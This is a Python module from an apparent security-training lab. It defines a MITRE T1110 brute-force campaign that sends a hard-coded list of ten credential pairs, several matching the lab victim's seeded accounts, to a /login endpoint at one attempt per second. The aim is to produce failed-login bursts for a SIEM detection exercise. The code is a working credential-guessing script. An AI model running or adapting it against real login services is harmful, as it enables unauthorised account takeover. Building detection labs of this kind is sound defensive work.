"""
campaigns/credential_access/brute_force.py -- T1110 Brute Force

MITRE ATT&CK: T1110 | Tactic: Credential Access

Phase B1b. Hammers victim-web's /login endpoint with a small fixed
wordlist. Generates failed-auth bursts for the SIEM threshold rule
documented in docs/domain-2-objectives.md Exercise 2.1.

Safety bounds (per OQ-1):
  * Only ever targets the configured TARGET_WEB URL inside lab-net.
  * Wordlist is hard-coded to ~10 entries -- this is a teaching demo, not
    a real attack tool.
  * Rate limited to one attempt per second so the victim container isn't
    DoS'd.
  * No persistent state written; cleanup() is a no-op.
"""

import json
import time
from datetime import UTC, datetime

from campaigns.base_campaign import BaseCampaign


class BruteForceCampaign(BaseCampaign):
    TECHNIQUE_ID = "T1110"
    TECHNIQUE_NAME = "Brute Force"
    TACTIC = "Credential Access"

    # Lab-only wordlist. Real attackers use rockyou.txt -- we use a
    # 10-entry educational sample that matches the victim's known
    # credentials (admin/password123, victim/letmein, test/test) plus
    # plausible decoys.
    WORDLIST = [
        ("admin",  "admin"),
        ("admin",  "password"),
        ("admin",  "password123"),    # known-good in victim seed
        ("root",   "root"),
        ("victim", "victim"),
        ("victim", "letmein"),        # known-good
        ("test",   "test"),           # known-good
        ("guest",  "guest"),
        ("user",   "12345"),
        ("admin",  "qwerty"),
    ]
    RATE_LIMIT_SECONDS = 1.0

    def run(self) -> dict:
        import requests

        self.log_step("init",
                      f"Brute-forcing /login on {self.target} "
                      f"({len(self.WORDLIST)} candidates)")

        successes: list[dict] = []
        failures = 0

        for username, password in self.WORDLIST:
            try:
                resp = requests.post(
                    f"{self.target.rstrip('/')}/login",
                    data={"username": username, "password": password},
                    timeout=5,
                    allow_redirects=False,
                )
                ok = self._is_success(resp.status_code, resp.text)
            except requests.RequestException as exc:
                self.log_step("attempt", f"{username}: error -- {exc}", "warning")
                failures += 1
                time.sleep(self.RATE_LIMIT_SECONDS)
                continue

            if ok:
                successes.append({"username": username, "password": password,
                                  "status": resp.status_code})
                self.log_step("attempt", f"{username}/{password}: SUCCESS", "success")
            else:
                failures += 1
                self.log_step("attempt", f"{username}/{password}: failed",
                              "warning")
            time.sleep(self.RATE_LIMIT_SECONDS)

        results = {
            "technique": self.TECHNIQUE_ID,
            "target": self.target,
            "attempts": len(self.WORDLIST),
            "successes": successes,
            "failures": failures,
            "timestamp": datetime.now(UTC).isoformat(),
        }
        self.save_artifact("brute_force_results.json", json.dumps(results, indent=2))
        return self.build_result(
            len(successes) > 0,
            f"Brute force complete: {len(successes)} success(es), {failures} failure(s)",
        )

    def _is_success(self, status: int, body: str) -> bool:
        """Login is considered successful on redirect or a known-good banner."""
        if status in (301, 302, 303):
            return True
        # victim-web sets `success` cookie or shows admin content on win
        return "admin secret" in body.lower() or "welcome" in body.lower()
